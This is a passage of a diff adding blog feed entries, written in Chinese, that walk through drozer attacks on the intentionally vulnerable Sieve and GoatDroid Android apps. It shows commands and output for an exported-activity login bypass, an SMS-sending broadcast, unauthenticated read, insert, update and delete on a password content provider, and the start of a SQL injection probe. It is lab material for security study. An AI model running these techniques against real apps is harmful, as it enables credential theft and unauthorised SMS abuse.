+ - android.permission.READ_MEDIA_IMAGES
+ Defines Permissions:
+ - com.mwr.example.sieve.READ_KEYS
+ - com.mwr.example.sieve.WRITE_KEYS
+
+dz&amp;gt; run app.package.manifest com.mwr.example.sieve # 確認該App的manifest有沒有什麼異常或漏洞的提示
+...
+
+dz&amp;gt; run app.package.attacksurface com.mwr.example.sieve # 確認該App的攻擊面有哪些
+Attempting to run shell module
+Attack Surface:
+ 3 activities exported
+ 0 broadcast receivers exported
+ 2 content providers exported
+ 2 services exported
+ is debuggable
+&lt;/code>&lt;/pre>看攻擊面的左邊就是該攻擊點有幾個&lt;/li>
+&lt;li>activities exported
+&lt;ol>
+&lt;li>列出exported activities有哪些
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.activity.info -a com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.FileSelectActivity
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.MainLoginActivity
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.PWList
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>啟動activity
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass
+![Screenshot_20240603-163856](&lt;a href="https://hackmd.io/_uploads/rkrr-ZsNA.png">https://hackmd.io/_uploads/rkrr-ZsNA.png&lt;/a> =200x)&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ol>
+&lt;h1 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h1>
+&lt;div class="footnotes" role="doc-endnotes">
+&lt;hr>
+&lt;ol>
+&lt;li id="fn:1">
+&lt;p>&lt;a href="https://blog.csdn.net/samlirongsheng/article/details/104926282">drozer之玩轉sieve&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>Test Sieve - broadcast receivers exported</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/</guid><description>&lt;h1 id="test-sieve---broadcast-receivers-exported">
+ Test Sieve - broadcast receivers exported
+ &lt;a class="anchor" href="#test-sieve---broadcast-receivers-exported">#&lt;/a>
+&lt;/h1>
+&lt;p>這個就不是用Sieve做示範，因為這個App沒有match的receiver&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.broadcast.info -a com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> No matching receivers.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以我就用之前安裝的goatdroid做示範&lt;/p>
+&lt;ol>
+&lt;li>檢查broadcast receiver
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.broadcast.info -a org.owasp.goatdroid.fourgoats
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: org.owasp.goatdroid.fourgoats
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>確認後就逆向看一下
+在&lt;code>org.owasp.goatdroid.fourgoats.broadcastreceivers&lt;/code>中有SendSMSNowReceiver這個class，內容如下:
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SendSMSNowReceiver&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> BroadcastReceiver {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Context context;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.BroadcastReceiver&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">onReceive&lt;/span>(Context arg0, Intent arg1) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> arg0;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SmsManager sms &lt;span style="color:#f92672">=&lt;/span> SmsManager.&lt;span style="color:#a6e22e">getDefault&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Bundle bundle &lt;span style="color:#f92672">=&lt;/span> arg1.&lt;span style="color:#a6e22e">getExtras&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sms.&lt;span style="color:#a6e22e">sendTextMessage&lt;/span>(bundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;phoneNumber&amp;#34;&lt;/span>), &lt;span style="color:#66d9ef">null&lt;/span>, bundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;message&amp;#34;&lt;/span>), &lt;span style="color:#66d9ef">null&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Utils.&lt;span style="color:#a6e22e">makeToast&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">context&lt;/span>, Constants.&lt;span style="color:#a6e22e">TEXT_MESSAGE_SENT&lt;/span>, 1);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>Send Something
+此時我們就可以用drozer發出一個intent，但是在發出之前要看一下AndroidManifest.xml中對於receiver的描述如下，如果想知道這個intent-filter代表的事情可以參考[^chatgpt-intent-filter]，簡單來說就是所有app都可以發出broadcast，那什麼樣的intent會被goatdroid所接收呢?就是帶有&lt;code>org.owasp.goatdroid.fourgoats.SOCIAL_SMS&lt;/code>這個action才會被接收，並且觸發onReceive這個function
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;manifest&lt;/span> &lt;span style="color:#a6e22e">versionCode=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">versionName=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1.0&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">package=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.owasp.goatdroid.fourgoats&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;application&lt;/span> &lt;span style="color:#a6e22e">theme=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@2131361870&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">label=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@2131296266&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">icon=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@2130837632&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">debuggable=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;true&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;receiver&lt;/span> &lt;span style="color:#a6e22e">label=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Send SMS&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">name=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.broadcastreceivers.SendSMSNowReceiver&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;intent-filter&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;action&lt;/span> &lt;span style="color:#a6e22e">name=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.owasp.goatdroid.fourgoats.SOCIAL_SMS&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;/action&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/intent-filter&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/receiver&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/application&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/manifest&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message &amp;#34;Hello mate!&amp;#34;
+&lt;/code>&lt;/pre>因為fourgoat這個App需要一個server，但是原作把server的link下架了，所以我也不知道實際送出這個broadcast會有什麼效果，但就是先紀錄起來，之後有機會可以用&lt;/li>
+&lt;/ol></description></item><item><title>Test Sieve - content providers exported - DB Based</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/</guid><description>&lt;h1 id="test-sieve---content-providers-exported---db-based">
+ Test Sieve - content providers exported - DB Based
+ &lt;a class="anchor" href="#test-sieve---content-providers-exported---db-based">#&lt;/a>
+&lt;/h1>
+&lt;p>如果想知道實際的狀況和content URI是什麼，可以參考&lt;a href="https://chatgpt.com/share/3a06c1d4-8117-4b27-ad02-1189b931066d">ChatGPT的說明&lt;/a>&lt;/p>
+&lt;ol>
+&lt;li>起手式
+從以下command的結果可以知道&lt;code>com.mwr.example.sieve.DBContentProvider&lt;/code>和&lt;code>com.mwr.example.sieve.FileBackupProvider&lt;/code>的狀況，並且從結果可以知道URI的形式長怎樣
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>content://com.mwr.example.sieve.DBContentProvider/Keys/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content://com.mwr.example.sieve.DBContentProvider/Passwords/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content://com.mwr.example.sieve.DBContentProvider/Passwords
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::spoiler
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.info -a com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Authority: com.mwr.example.sieve.DBContentProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Content Provider: com.mwr.example.sieve.DBContentProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Multiprocess Allowed: True
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Grant Uri Permissions: False
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uri Permission Patterns:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path Permissions:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path: /Keys
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Type: PATTERN_LITERAL
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: com.mwr.example.sieve.READ_KEYS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: com.mwr.example.sieve.WRITE_KEYS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Authority: com.mwr.example.sieve.FileBackupProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Content Provider: com.mwr.example.sieve.FileBackupProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Multiprocess Allowed: True
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Grant Uri Permissions: False
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uri Permission Patterns:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path Permissions:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.finduris -a com.mwr.example.sieve
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/Keys
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.DBContentProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Keys/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>For sure accessible content URIs:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
+&lt;li>逆向
+實際去看&lt;code>DBContentProvider&lt;/code>這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// android.content.ContentProvider&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">onCreate&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">pwdb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> PWDBHelper(getContext());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">sUriMatcher&lt;/span>.&lt;span style="color:#a6e22e">addURI&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.DBContentProvider&amp;#34;&lt;/span>, PWTable.&lt;span style="color:#a6e22e">TABLE_NAME&lt;/span>, 100);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">sUriMatcher&lt;/span>.&lt;span style="color:#a6e22e">addURI&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.DBContentProvider&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Keys&amp;#34;&lt;/span>, KEY);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table)&lt;/li>
+&lt;li>query/insert/update/delete/sqli
+&lt;ul>
+&lt;li>query
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Simple Query&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>insert
+根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id &lt;span style="color:#ae81ff">2&lt;/span> --string password bbb --string email aaa@bbb.com
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password bbb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email aaa@bbb.com
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>update
+_id=2的data，被我們改掉了
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selection-args &lt;span style="color:#ae81ff">2&lt;/span> --string password ccc --string email ddd@eee.com
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password ccc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email ddd@eee.com
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>delete
+只剩下最一開始我們設定的data
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selection-args &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password b&lt;span style="color:#e6db74">&amp;#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&amp;#39;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Base64-encoded&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email bernie6401@gmail.com
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>sqli
+如下結果所示，的確存在sqli，並且可以得到完整的table
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 先嘗試丟一些trash byte&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
